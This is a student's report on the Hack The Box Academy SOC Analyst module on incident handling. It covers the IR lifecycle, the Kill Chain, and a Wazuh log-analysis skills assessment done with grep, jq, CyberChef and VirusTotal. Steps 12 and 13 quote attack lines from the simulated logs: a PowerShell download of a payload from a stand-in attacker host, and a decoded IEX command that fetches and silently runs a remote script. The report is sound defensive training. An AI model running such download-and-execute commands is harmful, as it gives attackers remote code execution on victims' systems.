# HTB Academy SOC Analyst Path — Module 1 Report

**Platform:** Hack The Box Academy
**Path:** SOC Analyst (HTB Certified Defensive Security Analyst track)
**Module:** Module 1 — Incident Handling Process
**Author:** CypherX

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Module Overview](#module-overview)
3. [Learning Objectives](#learning-objectives)
4. [Concepts Learned](#concepts-learned)
5. [Practical Module Walkthrough](#practical-module-walkthrough)
6. [Investigation / Analyst Mindset](#investigation--analyst-mindset)
7. [Tools and Frameworks Used](#tools-and-frameworks-used)
8. [MITRE ATT&CK Alignment](#mitre-attck-alignment)
9. [Skills Developed](#skills-developed)
10. [Key Takeaways](#key-takeaways)
11. [Conclusion](#conclusion)
12. [Reference Lab Images](#reference-lab-images)

---

## Executive Summary

This report documents my completion of **Module 1 — Incident Handling Process**, the entry point of Hack The Box Academy's SOC Analyst Job Role Path (which leads toward the HTB Certified Defensive Security Analyst certification). The module is classified by HTB as "Fundamental" and is primarily procedural/theoretical, walking a future SOC analyst through the four stages of the incident handling lifecycle, the Cyber Kill Chain, and how those concepts are applied when triaging real alerts.

The module closes with a hands-on Skills Assessment built around a fictional breach scenario ("Insight Nexus"), where a simulated Wazuh SIEM export had to be parsed for indicators of credential compromise, persistence, lateral movement, command-and-control activity, and data exfiltration. My screenshots capture both the theoretical sections (lifecycle diagrams, embedded Wazuh alert walkthroughs mapped to the Cyber Kill Chain and to Detection & Analysis / Containment stages) and the graded practical exercise, where I used `grep`, `jq`, CyberChef, and VirusTotal to extract and validate indicators of compromise (IOCs) directly from raw JSON log exports.

This module establishes the procedural backbone — *how* an analyst is expected to think and act during an incident — that the rest of the SOC Analyst path (SIEM fundamentals, Windows Event Logs, threat hunting, malware analysis, etc.) builds on.

## Module Overview

"Incident Handling Process" covers the core stages of incident handling from the perspective of the person actually responding to the alert, not just the tooling. It introduces the four-phase **Incident Response Life Cycle** (Preparation → Detection & Analysis → Containment, Eradication & Recovery → Post-Incident Activity), explains how the **Cyber Kill Chain** maps attacker behavior onto that lifecycle, and shows what "good documentation" and IOC handling look like in practice.

Within the SOC Analyst path, this module sits first for a reason: before an analyst can meaningfully use a SIEM, hunt threats, or write an incident report, they need a shared vocabulary and a repeatable process for what to do when an alert fires. The module explicitly states that it has limited standalone hands-on labs compared to later modules — the practical weight is concentrated in a final Skills Assessment, where theory is tested against a realistic, if fictional, incident.

## Learning Objectives

- Understand incident handling as a defined, repeatable process rather than ad-hoc response.
- Learn the four stages of the Incident Response Life Cycle and what activities belong in each.
- Understand the Cyber Kill Chain and how it frames attacker progression (Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives).
- Recognize common attacker tradecraft an analyst must be able to spot in logs: credential dumping, persistence via service creation, command-and-control callbacks, and data exfiltration.
- Practice extracting and validating IOCs (IPs, hashes, usernames, file paths) from raw SIEM log exports using command-line tools.
- Build the habit of cross-referencing internal log evidence with external threat intelligence (e.g., VirusTotal) before drawing conclusions.

## Concepts Learned

### Incident Response Life Cycle
The module's foundational model: **Preparation → Detection and Analysis → Containment, Eradication and Recovery → Post-Incident Activity**, presented as a continuous loop rather than a linear checklist (Figure 1). Preparation covers the people, tooling, and playbooks in place *before* anything happens; Detection and Analysis is where alerts get triaged and validated; Containment/Eradication/Recovery is where the analyst limits blast radius and removes the threat; Post-Incident Activity captures lessons learned that feed back into Preparation.

### The Cyber Kill Chain
A model for describing the stages an attacker moves through to accomplish an objective. In this module it's used specifically to explain *why* certain telemetry (e.g., a credential-dumping tool touching LSASS) indicates a specific stage of an active intrusion, which in turn tells the analyst how urgently to respond and what containment actions make sense.

### Credential Dumping (LSASS Access)
Tools like Mimikatz read the LSASS process memory to recover cached credentials (plaintext passwords, hashes, Kerberos tickets). SOC analysts are trained to treat any process opening a handle to `lsass.exe` — especially from a non-standard binary — as a high-severity indicator, mapped to MITRE ATT&CK **T1003 / T1003.001 (OS Credential Dumping: LSASS Memory)**.

### Persistence via Service Creation
Attackers (and tools like PsExec) frequently install a Windows service to guarantee re-execution or remote command execution. A `Service Control Manager` log entry showing an unusual `imagePath` (e.g., a service binary dropped outside expected directories) is a classic persistence/lateral-movement indicator that SOC analysts are trained to hunt for.

### Command and Control & Tool Transfer
Once a foothold exists, attackers commonly pull down additional tooling from infrastructure they control. MITRE ATT&CK formalizes this as **T1105 (Ingress Tool Transfer)** — a technique this module specifically tests via a scenario-based question.

### Data Exfiltration
Outbound connections carrying archived or staged data (e.g., a `.zip` file POSTed to an external host) are a late-stage indicator on the Kill Chain ("Actions on Objectives"). Recognizing exfiltration in logs requires correlating a process, a destination IP/port, and a payload/file name.

### Valid Accounts & Initial Access
Not every intrusion starts with malware — a successful admin login from an unexpected external IP/geolocation is itself an IOC, mapped to **T1078 (Valid Accounts)**. This module reinforces that identity misuse is as important to catch as binary-based attacks.

### Obfuscated / Encoded Commands
PowerShell's `-EncodedCommand` flag is a common defense-evasion and living-off-the-land technique: it Base64-encodes a script so it doesn't appear in plaintext in process logs. Analysts need to recognize the pattern (a long Base64-looking string following `-enc`/`-EncodedCommand`) and decode it — typically with a tool like CyberChef — to recover the attacker's actual intent.

## Practical Module Walkthrough

### Step 1 — Incident Response Life Cycle (Theory)
**Screenshot Analysis:** The module landing page at 0% progress, showing the Incident Response Life Cycle diagram (Preparation → Detection and Analysis → Containment, Eradication and Recovery → Post-Incident Activity) as a continuous loop.
**Technical Explanation:** This is the model every later section builds on — each subsequent alert investigated in this module is implicitly framed as sitting in the "Detection and Analysis" stage.
**SOC Relevance:** Analysts need a shared mental model so that handoffs between shifts/teams stay consistent regardless of who's on the alert.
**Evidence:** (Figure 1)

### Step 2 — Cyber Kill Chain: Investigating an LSASS Access Alert
**Screenshot Analysis:** Within the Cyber Kill Chain section, an embedded Wazuh alerts dashboard shows a triggered rule: *"Lsass process was accessed by C:\Users\administrator.TECHRANGE\Downloads\mimikatz_trunk\x64\mimikatz.exe with read permissions, possible credential dump"* (rule 92900) on host **SCWIN01** (172.16.200.2). Opening the alert detail confirms `rule.mitre.id: T1003.001`.
**Technical Explanation:** This is a textbook LSASS-access detection — Wazuh flagged a non-standard process (Mimikatz, run from a Downloads folder) requesting read access to `lsass.exe`.
**SOC Relevance:** Mapping this single alert to a Kill Chain stage (Installation/Actions on Objectives, depending on context) helps the analyst decide urgency and next steps rather than treating it as an isolated event.
**Evidence:** (Figure 2, Figure 3)

### Step 3 — Detection & Analysis Stage: Correlating the Mimikatz Alert
**Screenshot Analysis:** The same Mimikatz detection reappears as a fully enriched alert titled *"[InsightNexus] Hacker tool Mimikatz was detected"*, tagged `InsightNexus`, `Mimikatz`, `T1003.001`, `Credential Dumping`, `T1003`, `Critical`. The description explicitly calls out immediate containment and credential reset as the recommended response. The alert list view also shows a second, related alert — *"[InsightNexus] Admin Login via ManageEngine Web Console"* — sitting alongside it.
**Technical Explanation:** This demonstrates how a SIEM enriches a raw rule match with tags, severity, and a human-readable recommendation, turning a log line into an actionable case.
**SOC Relevance:** Analysts learn to read the *enrichment*, not just the raw log — tags like "Critical" and MITRE IDs are what drive escalation and prioritization in a real queue.
**Evidence:** (Figure 4, Figure 5)

### Step 4 — Containment, Eradication & Recovery: A Second Credential-Access Technique
**Screenshot Analysis:** A related alert, *"Suspicious process loaded VaultCli.dll module. Possible use to dump stored passwords"*, is shown at Medium severity with full file hashes (MD5, SHA1, SHA256, IMPHASH) and a `Signed: true` flag.
**Technical Explanation:** `VaultCli.dll` is the Windows Credential Manager/Vault API — malware loading it is attempting to read stored credentials outside of LSASS, a technique distinct from but related to classic credential dumping. The `Signed: true` field is a reminder that code-signing alone does not guarantee benign intent.
**SOC Relevance:** Containment decisions (isolate host, rotate credentials, revoke sessions) often depend on details like these — an analyst needs to read past the alert title into the observable metadata.
**Evidence:** (Figure 6)

### Step 5 — Skills Assessment: Insight Nexus Incident Analysis (Credential Compromise)
**Screenshot Analysis:** Using the downloaded `wazuh_export.json`, I ran:
```
grep -i -A 15 -B 5 "lsass|mimikatz|procdump|pypykatz" wazuh_export.json
```
This surfaced a Windows Security-Auditing event (ID 4688 — process creation) showing `newProcessName: C:\Users\Administrator\Downloads\mimikatz.exe` with `parentProcessName: C:\Program Files\Mozilla Firefox\firefox.exe`. The question asked for the full parent process path of the credential-dumping tool; I answered **`C:\Program Files\Mozilla Firefox\firefox.exe`**, confirmed correct.
**Technical Explanation:** A browser spawning Mimikatz is itself an anomaly — it strongly suggests the credential dumper was delivered via a drive-by download or a malicious browser extension/script rather than being run interactively by an administrator.
**SOC Relevance:** Parent-child process relationships are one of the highest-value pivots in endpoint telemetry; an unexpected parent is often more suspicious than the child process itself.
**Evidence:** (Figure 7)

### Step 6 — Skills Assessment: Identifying a Persistence Mechanism
**Screenshot Analysis:** Searching the same export for service-installation activity:
```
grep -i -C 5 "imagePath" wazuh_export.json
```
returned a Service Control Manager event with `serviceName: PSEXESVC` and `imagePath: C:\Windows\PSEXESVC.exe`, run as `SYSTEM` on host **DB01**. Answer submitted and confirmed: **`C:\Windows\PSEXESVC.exe`**.
**Technical Explanation:** `PSEXESVC` is the artifact left behind by Sysinternals PsExec — a legitimate admin tool frequently abused for remote command execution and lateral movement. Its presence on a database server is a strong lateral-movement/persistence indicator.
**SOC Relevance:** Recognizing well-known "living-off-the-land" tool artifacts (rather than only looking for custom malware) is a core detection skill.
**Evidence:** (Figure 8)

### Step 7 — Skills Assessment: Identifying Data Exfiltration
**Screenshot Analysis:** A Sysmon network-connection event showed `image: C:\Users\svc_deployer\AppData\Roaming\updater.exe` connecting to `93.184.216.34:443` with the detail `HTTP POST /upload diagnostics_data.zip`. Answer submitted and confirmed: **`93.184.216.34`**.
**Technical Explanation:** A service-account-owned binary in `AppData\Roaming` making an outbound HTTPS POST of an archive is a classic staged-exfiltration pattern — the archive name ("diagnostics_data.zip") is a mildly camouflaged filename designed to look benign to a casual reviewer.
**SOC Relevance:** Exfiltration detection depends on correlating an unusual process, an unusual destination, and an unusual payload — no single field tells the whole story.
**Evidence:** (Figure 9)

### Step 8 — Skills Assessment: Tracing Lateral Movement to a File Share
**Screenshot Analysis:** This question — *"Which user tried to connect to the file share `\\fs01\projects`?"* — took several passes. I first opened `wazuh_export.json` directly in Firefox's built-in JSON viewer and used in-page search for "projects" (Figure 10). I then confirmed the host via `grep -i -C 10 "fs01" wazuh_export.json`, identifying agent **FS01** (172.16.10.20) (Figure 11), before running `grep -i -C 10 "projects" wazuh_export.json` to pull the full Sysmon event: `image: svchost.exe`, `sourceIp: 172.16.200.50` → `destinationIp: 172.16.10.20:445`, `user: svc_admin`, `details: SMB connect to \\fs01\projects` (Figure 12). I cross-checked additional FS01 log entries at different timestamps to make sure I had the right match before submitting (Figures 13–14). Answer submitted and confirmed: **`svc_admin`**.
**Technical Explanation:** This mirrors the reality of log analysis — the first grep often returns *too many* matches across a busy agent (FS01 appears in multiple unrelated events), so the analyst has to narrow with a second, more specific term ("projects") and read the surrounding context to confirm the right event.
**SOC Relevance:** SMB (port 445) connections between internal hosts, especially involving service accounts, are a standard lateral-movement/insider-risk indicator worth tracking regardless of whether the account is later confirmed compromised.
**Evidence:** (Figure 10, Figure 11, Figure 12, Figure 13, Figure 14)

### Step 9 — Skills Assessment: Investigating a Suspicious Admin Login (Initial Access)
**Screenshot Analysis:** A separate alert, *"[InsightNexus] Admin Login via ManageEngine Web Console"*, tagged `T1078.001`, `Valid Accounts`, `Initial Access`, described a successful admin login on ManageEngine ADManager Plus from external IP **103.112.60.117**, outside the expected geolocation, followed by directory enumeration. The alert's network-connection comments referenced two further IPs of interest: **203.0.113.18** and **198.51.100.24**. I pivoted both into VirusTotal.
**Technical Explanation:** A successful login from an unexpected geolocation is treated as presumptively compromised credentials until proven otherwise — the follow-on directory enumeration (an AD reconnaissance behavior) reinforces that assessment.
**SOC Relevance:** Initial-access alerts driven by identity misuse (rather than malware) require pivoting into identity and network context, not just endpoint telemetry.
**Evidence:** (Figure 15, Figure 17)

### Step 10 — Skills Assessment: IOC Enrichment with VirusTotal
**Screenshot Analysis:** Looking up **203.0.113.18** on VirusTotal's Relations tab showed a mix of unrelated communicating files (several benign Android APKs) and 121 "files referring" entries, including a flagged Windows executable (`MangoJava.exe`, 42/70 detections). Looking up **198.51.100.24** on the Details tab revealed, via WHOIS, that the address is an **IANA-reserved documentation range under RFC 5737** — not real-world attacker infrastructure.
**Technical Explanation:** This is an important and often-missed step: 198.51.100.0/24 (and 203.0.113.0/24, used elsewhere in this same exercise) are TEST-NET ranges specifically reserved for documentation and training. Confirming this via VirusTotal's WHOIS data validates that the "attacker IP" is a deliberately fictional value built into the lab, not a real indicator to act on outside the exercise.
**SOC Relevance:** Analysts are trained never to treat an IOC as validated until it's been checked against external context (WHOIS, reputation, ASN ownership) — this step is exactly that discipline in practice, and it also protects against wasting response effort chasing a non-existent real-world address.
**Evidence:** (Figure 16, Figure 18)

### Step 11 — Skills Assessment: Mapping Tool Transfer to MITRE ATT&CK
**Screenshot Analysis:** Question: *"If malware downloads files from a C2 (Command and Control) server into the victim network, under what MITRE technique ID does this tool transfer technique fall?"* Answer submitted and confirmed: **T1105**.
**Technical Explanation:** T1105 (Ingress Tool Transfer) is the ATT&CK technique for exactly this behavior — pulling additional tools or payloads into a compromised environment from attacker-controlled infrastructure.
**SOC Relevance:** Being able to name the correct technique ID (not just describe the behavior) matters for writing detections, tagging alerts consistently, and communicating with other analysts/teams in a shared vocabulary.
**Evidence:** (Figure 19)

### Step 12 — Skills Assessment: Investigating a Suspicious PowerShell Downloader
**Screenshot Analysis:** Searching the export for PowerShell activity (`grep -i "powershell" Wazuh_export.json`) surfaced an alert titled *"PowerShell suspicious download and write to AppData"*. Expanding the surrounding context (`grep -i -C 10 "powershell.exe" Wazuh_export.json`) revealed the full Sysmon event: `parentImage: C:\Windows\System32\mshta.exe` spawning `powershell.exe`, with a command line calling `System.Net.WebClient.DownloadFile()` against `http://attacker.cdn/payload.exe`, writing the result to `targetFilename: C:\Users\victim\AppData\Roaming\updater.exe`.
**Technical Explanation:** `mshta.exe` spawning PowerShell is a well-known "living-off-the-land binary" (LOLBin) chain, often used to slip past application allow-lists — `mshta.exe` is trusted by default but can execute arbitrary script content.
**SOC Relevance:** Recognizing suspicious *process lineage* (mshta → powershell → download → write to AppData) is often a stronger signal than any single indicator in isolation.
**Evidence:** (Figure 20, Figure 21)

### Step 13 — Skills Assessment: Decoding an Obfuscated PowerShell Command
**Screenshot Analysis:** A separate question asked to identify a suspicious IP address *after decoding* a PowerShell command found in `logs-wazuh.zip`. Initial `jq` attempts against `wazuhexport.json` hit syntax errors before succeeding with `jq '.[] | select(tostring | test("powershell";"i"))'`, which surfaced an unrelated agent (`SRV-MANAGE01`, 172.16.50.20). The actual encoded command was located with:
```
jq '.[] | .. | strings | select(test("[A-Za-z0-9+/]{20,}={0,2}"))' logs-wazuh.json
```
which matched a Base64 pattern and returned an alert titled *"Suspicious PowerShell execution with EncodedCommand (possible downloader/obfuscation)"* along with the full `-EncodedCommand` blob and its SHA256 hash (Figure 23 — full text visible in the screenshot). Feeding that Base64 string into CyberChef's **From Base64** recipe decoded it to:
```
IEX (New-Object System.Net.WebClient).DownloadString('http://198.51.100.24/defender/deploy-definitions.ps1');
Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -File C:\Windows\Temp\deploy-definitions.ps1'
```
revealing the suspicious IP: **198.51.100.24**.
**Technical Explanation:** `-EncodedCommand` is a defense-evasion technique (Base64-encoding a script to avoid plaintext detection in command-line logging). Decoding it is a mandatory step before the true intent — here, downloading and silently executing a remote script disguised as a "defender" update — can be assessed.
**SOC Relevance:** This is one of the most common obfuscation patterns a SOC analyst will encounter; being fluent with `jq`'s regex filtering to *find* the encoded blob, and with CyberChef to *decode* it, is a practical, everyday skill.
**Evidence:** (Figure 22, Figure 23, Figure 24)

### Step 14 — Skills Assessment: Attributing the Command to a User
**Screenshot Analysis:** Final question in this thread: *"Identify the user who executed the suspicious PowerShell command. The format is domain\user."* Filtering the log export for PowerShell activity and inspecting the associated user field returned **`CORP\svc-update`**, confirmed correct.
**Technical Explanation:** Closing the loop from "what happened" (the encoded download) to "under which account" is the step that turns a technical finding into an actionable response item — e.g., disabling/rotating that account.
**SOC Relevance:** Every finding in an incident should ultimately be attributable to a host, a process, and an identity; this question exercises that final attribution step.
**Evidence:** (Figure 25)

## Investigation / Analyst Mindset

Across the practical walkthrough, a consistent investigative pattern emerges:

- **Start broad, then narrow.** Several steps show an initial `grep`/`jq` query returning too much (or malformed) output, followed by a refined query — this reflects real analyst work far more than a single perfect command.
- **Cross-reference before concluding.** The pivot from the ManageEngine login alert into VirusTotal (Figures 16, 18) shows the habit of validating an IOC externally rather than trusting it at face value — and in this case, that validation revealed the IP was a documentation-range placeholder rather than real attacker infrastructure.
- **Follow process lineage, not just event titles.** The Mimikatz-via-Firefox and mshta-via-PowerShell findings both depended on reading parent/child process relationships rather than the alert title alone.
- **Attribute findings to an identity.** Nearly every technical finding (a file path, an IP, a service) was ultimately traced back to a specific account (`svc_admin`, `svc_deployer`, `CORP\svc-update`), reflecting the SOC principle that technical IOCs exist to drive human/account-level response actions.
- **Document as you go.** The repeated, deliberate answer-then-confirm pattern in the Skills Assessment mirrors how a real analyst would log findings into a case management system as they're discovered, rather than all at once at the end.

## Tools and Frameworks Used

| Tool / Framework | Purpose | SOC Relevance |
|---|---|---|
| **Wazuh** | Open-source SIEM/XDR used to generate, enrich, and display alerts | Central platform where most triage in this module took place; alert tagging (MITRE IDs, severity, TLP/PAP) mirrors real SOC tooling |
| **grep** | Command-line pattern search across raw JSON log exports | Fast first-pass filtering of large log dumps for keywords (`lsass`, `imagePath`, `fs01`, `powershell`) |
| **jq** | JSON query/filter language | Precise, structured extraction from JSON logs where `grep` alone is too blunt (e.g., regex-matching Base64 blobs) |
| **CyberChef** | Web-based "data manipulation Swiss Army knife" | Used here specifically for Base64 decoding to reveal an obfuscated PowerShell payload |
| **VirusTotal** | Threat intelligence / file & IP reputation lookup | Used to enrich and validate IOCs (IP WHOIS, file hash detections) pulled from the SIEM |
| **MITRE ATT&CK** | Shared adversary tactics/techniques knowledge base | Used throughout to classify observed behavior (T1003.001, T1105, T1078.001) into a common analyst vocabulary |

## MITRE ATT&CK Alignment

| Technique | ID | Where Observed | SOC Detection Relevance |
|---|---|---|---|
| OS Credential Dumping: LSASS Memory | **T1003.001** | Mimikatz alert (Figures 2–4); explicitly tagged by Wazuh | Detect non-standard processes opening handles to `lsass.exe`; treat as high-severity regardless of parent process |
| Ingress Tool Transfer | **T1105** | Skills Assessment question, confirmed answer (Figure 19); also matches the CyberChef-decoded downloader (Figure 24) | Detect outbound connections immediately followed by new files written to disk from unusual locations |
| Valid Accounts | **T1078 / T1078.001** | ManageEngine admin login alert (Figures 15, 17) | Flag successful authentications from unexpected geolocations/ASNs, especially followed by enumeration activity |

Two additional behaviors observed don't carry an explicit in-alert MITRE tag in these screenshots, but are worth noting for context: the `PSEXESVC` service-creation event (Figure 8) is commonly associated with **T1569.002 (System Services: Service Execution)** and/or lateral movement via **T1021.002 (Remote Services: SMB/Windows Admin Shares)**, and the `-EncodedCommand` PowerShell usage (Figures 20–24) is commonly associated with **T1027 (Obfuscated Files or Information)** in addition to **T1059.001 (Command and Scripting Interpreter: PowerShell)**. These mappings are provided as general ATT&CK context rather than as confirmed answers from the module itself.

## Skills Developed

- Applying the four-stage Incident Response Life Cycle and Cyber Kill Chain as practical triage frameworks, not just theory.
- Reading enriched SIEM alerts (Wazuh) for severity, TLP/PAP handling, and MITRE tagging.
- Using `grep` and `jq` to search and structurally filter large raw JSON log exports.
- Recognizing credential-dumping, persistence, lateral-movement, C2, and exfiltration patterns in Windows event/Sysmon telemetry.
- Decoding obfuscated PowerShell (`-EncodedCommand`) using CyberChef.
- Enriching and validating IOCs (IPs, hashes) against external threat intelligence (VirusTotal), including recognizing IANA-reserved documentation ranges.
- Attributing technical findings back to specific hosts and user accounts — the step that turns analysis into an actionable response.

## Key Takeaways

Module 1 reframed incident handling as a disciplined, repeatable process rather than a collection of individual alerts to react to. The most valuable habit reinforced throughout the Skills Assessment was **never trusting a single data point** — every finding here required either a second, narrower query to confirm it, or an external lookup (VirusTotal) to validate it, or both. That discipline, more than any single command, is what the module was actually testing. It also sets up the rest of the SOC Analyst path well: the raw log formats (Sysmon, Windows Security auditing, Wazuh JSON exports) and command-line techniques (`grep`, `jq`) practiced here will reappear directly in the SIEM Fundamentals and Windows Event Logs modules that follow.

## Conclusion

Module 1 — Incident Handling Process has been fully completed, covering the Incident Response Life Cycle, the Cyber Kill Chain, and a hands-on Skills Assessment built around a simulated breach ("Insight Nexus") spanning credential dumping, persistence, lateral movement, command-and-control tool transfer, data exfiltration, and identity-based initial access. Beyond the specific answers submitted, this module built the foundational analyst habits — narrowing queries, cross-referencing process lineage, and validating IOCs externally — that the remainder of the SOC Analyst path will continue to build on.
